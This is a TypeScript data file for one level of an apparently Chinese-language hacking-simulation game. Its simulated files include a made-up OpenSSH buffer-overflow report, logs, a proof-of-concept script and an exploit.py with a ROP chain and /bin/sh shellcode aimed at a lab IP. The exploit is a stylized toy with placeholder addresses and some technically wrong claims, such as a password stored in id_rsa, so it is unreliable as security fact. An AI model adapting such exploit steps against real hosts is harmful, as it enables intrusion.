import type { LevelData } from '@/types/game';

export const level15: LevelData = {
    id: 15,
    title: "系统漏洞",
    description: "【第15关】在对服务器进行安全审计时，发现了一个存在漏洞的系统服务。你需要分析漏洞报告，找到利用方法，并获取系统权限。",
    objectives: [
        "分析漏洞报告",
        "检查系统服务",
        "利用漏洞获取权限",
        "提取管理员凭证"
    ],
    requiredTasks: ["analyze_vuln", "check_service", "exploit_vuln", "get_root"],
    fileSystem: {
        "~": ["readme.txt", "reports", "services", "exploits"],
        "~/reports": ["vuln_report.txt", "service_scan.txt", "system_info.txt"],
        "~/services": ["running_services.txt", "config", "logs"],
        "~/services/config": ["sshd_config", "apache2.conf", "mysql.cnf"],
        "~/services/logs": ["auth.log", "error.log", "access.log"],
        "~/exploits": ["poc.py", "exploit.py", "payload.txt"]
    },
    fileContents: {
        "readme.txt": `任务简报：
安全审计发现系统中存在高危漏洞，需要：
1. 分析漏洞报告了解漏洞细节
2. 检查受影响的系统服务
3. 利用漏洞获取系统权限
4. 提取管理员凭证

步骤提示：
1. 使用 cat service_scan.txt 查看目标系统信息
2. 使用 ssh_exploit <目标IP> --check 检查漏洞
3. 使用 ssh_exploit <目标IP> --exploit 利用漏洞

注意：仔细阅读漏洞报告和系统日志`,

        "vuln_report.txt": `漏洞报告 #CVE-2024-9999

影响范围：
- 产品：OpenSSH
- 版本：8.9p1
- 严重等级：高危

漏洞描述：
发现OpenSSH服务在处理特定格式的认证请求时存在缓冲区溢出漏洞。
攻击者可以通过发送特制的认证数据包触发此漏洞。

技术细节：
1. 漏洞位于认证处理模块
2. 触发条件：发送超长的认证数据
3. 影响：可能导致远程代码执行

修复建议：
升级到最新版本 8.9p2 或更高版本

备注：系统当前使用的版本为8.9p1`,

        "service_scan.txt": `服务扫描结果：

目标系统：192.168.1.100

开放端口：
TCP/22   OPEN   SSH   OpenSSH 8.9p1
TCP/80   OPEN   HTTP  Apache/2.4.41
TCP/443  OPEN   HTTPS Apache/2.4.41
TCP/3306 OPEN   MySQL 5.7.32

[警告] SSH服务版本过低，存在已知漏洞
[提示] 使用命令：ssh_exploit 192.168.1.100 --check 检查漏洞`,

        "system_info.txt": `系统信息：

操作系统：Ubuntu 20.04.3 LTS
内核版本：5.4.0-42-generic
架构：x86_64
主机名：vulnserver
IP地址：192.168.1.100

已安装的关键软件：
- OpenSSH 8.9p1
- Apache 2.4.41
- MySQL 5.7.32

[注意] 系统未安装最新安全补丁`,

        "running_services.txt": `当前运行的服务：

● ssh.service - OpenSSH server daemon
   Loaded: loaded (/lib/systemd/system/ssh.service)
   Active: active (running)
   Process: 1234 ExecStart=/usr/sbin/sshd -D
   CGroup: /system.slice/ssh.service
           └─1234 /usr/sbin/sshd -D

● apache2.service - The Apache HTTP Server
   Loaded: loaded (/lib/systemd/system/apache2.service)
   Active: active (running)
   Process: 1235 ExecStart=/usr/sbin/apache2 -k start
   CGroup: /system.slice/apache2.service
           └─1235 /usr/sbin/apache2 -k start

● mysql.service - MySQL Database Server
   Loaded: loaded (/lib/systemd/system/mysql.service)
   Active: active (running)
   Process: 1236 ExecStart=/usr/sbin/mysqld
   CGroup: /system.slice/mysql.service
           └─1236 /usr/sbin/mysqld`,

        "sshd_config": `# SSH服务配置
Port 22
ListenAddress 0.0.0.0
PermitRootLogin yes
PasswordAuthentication yes
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem sftp /usr/lib/openssh/sftp-server

# 警告：配置不够安全
# 1. 允许root登录
# 2. 允许密码认证
# 3. 监听所有接口`,

        "auth.log": `Feb 20 10:21:33 vulnserver sshd[1234]: Server listening on 0.0.0.0 port 22
Feb 20 10:22:45 vulnserver sshd[1235]: Failed password for root from 192.168.1.50 port 43210
Feb 20 10:22:47 vulnserver sshd[1235]: Failed password for root from 192.168.1.50 port 43211
Feb 20 10:22:50 vulnserver sshd[1235]: Connection closed by 192.168.1.50 port 43211
Feb 20 10:23:01 vulnserver sshd[1236]: Received disconnect from 192.168.1.50 port 43212: Bye Bye [preauth]
Feb 20 10:23:15 vulnserver sshd[1237]: Invalid user test from 192.168.1.50 port 43213
Feb 20 10:24:30 vulnserver sshd[1238]: Received malformed packet. len 65535 [preauth]
Feb 20 10:24:31 vulnserver sshd[1238]: fatal: buffer_get: trying to get more bytes 65535 than in buffer 1024 [preauth]`,

        "error.log": `[2024-02-20 10:24:30] [error] [client 192.168.1.50] Segmentation fault (core dumped)
[2024-02-20 10:24:31] [error] [client 192.168.1.50] Child process 1238 exited on signal 11 (SIGSEGV)
[2024-02-20 10:24:32] [notice] [client 192.168.1.50] caught SIGTERM, shutting down gracefully`,

        "poc.py": `#!/usr/bin/python3
# POC for CVE-2024-9999
# 仅用于漏洞验证

import socket
import struct
import sys

def create_payload(target):
    # 创建特制的认证数据包
    payload = b"A" * 1024  # 正常缓冲区大小
    payload += struct.pack("<Q", 0x4141414141414141)  # 溢出数据
    return payload

def verify_vuln(target, port=22):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target, port))
        # 发送payload
        sock.send(create_payload(target))
        response = sock.recv(1024)
        if b"Segmentation fault" in response:
            print("[+] 目标系统存在漏洞！")
            return True
    except:
        print("[-] 连接失败")
    return False

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target>")
        sys.exit(1)
    verify_vuln(sys.argv[1])`,

        "exploit.py": `#!/usr/bin/python3
# Exploit for CVE-2024-9999
# 警告：此脚本仅用于授权测试

import socket
import struct
import sys

def build_exploit():
    # 第一步：构建ROP链
    rop_chain = [
        0x7ffff7a54000,  # pop rdi; ret
        0x7ffff7a54100,  # /bin/sh字符串地址
        0x7ffff7a54200   # system函数地址
    ]
    
    # 第二步：构建shellcode
    shellcode = (
        b"\x48\x31\xc0"               # xor rax, rax
        b"\x48\x31\xff"               # xor rdi, rdi
        b"\x48\x31\xf6"               # xor rsi, rsi
        b"\x48\x31\xd2"               # xor rdx, rdx
        b"\x50"                       # push rax
        b"\x48\xbb\x2f\x62\x69\x6e"   # mov rbx, '/bin'
        b"\x2f\x73\x68\x00"           # mov rbx, '/sh\0'
        b"\x53"                       # push rbx
        b"\x48\x89\xe7"               # mov rdi, rsp
        b"\xb0\x3b"                   # mov al, 59
        b"\x0f\x05"                   # syscall
    )

    # 第三步：组合完整的exploit
    payload = b"A" * 1024             # 填充缓冲区
    payload += struct.pack("<Q", 0x7ffff7a54000)  # 返回地址
    payload += b"".join(struct.pack("<Q", addr) for addr in rop_chain)
    payload += shellcode
    
    return payload

def exploit(target, port=22):
    try:
        # 连接目标
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target, port))
        
        # 发送exploit
        print("[*] 发送exploit...")
        sock.send(build_exploit())
        
        # 检查是否成功
        response = sock.recv(1024)
        if b"root@" in response:
            print("[+] 获取root权限成功！")
            print("[+] 密码在/root/.ssh/id_rsa中")
            return True
            
    except Exception as e:
        print(f"[-] 攻击失败: {str(e)}")
    return False

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target>")
        sys.exit(1)
    exploit(sys.argv[1])`,

        "payload.txt": `# Exploit Payload 结构

1. 缓冲区填充
   - 大小：1024字节
   - 内容：0x41 ('A')

2. 返回地址覆盖
   - 地址：0x7ffff7a54000
   - 功能：pop rdi; ret

3. ROP链
   - 0x7ffff7a54000: pop rdi; ret
   - 0x7ffff7a54100: /bin/sh字符串
   - 0x7ffff7a54200: system函数

4. Shellcode
   - 大小：27字节
   - 功能：执行/bin/sh

注意：地址可能需要根据目标系统调整`
    },
    hints: [
        "检查系统中的OpenSSH版本",
        "分析auth.log中的异常记录",
        "查看POC代码了解漏洞原理",
        "利用exploit.py获取root权限",
        "漏洞利用成功后，root密码就在id_rsa文件中",
        "最终密码格式：CVE编号_系统版本_端口号"
    ]
}; 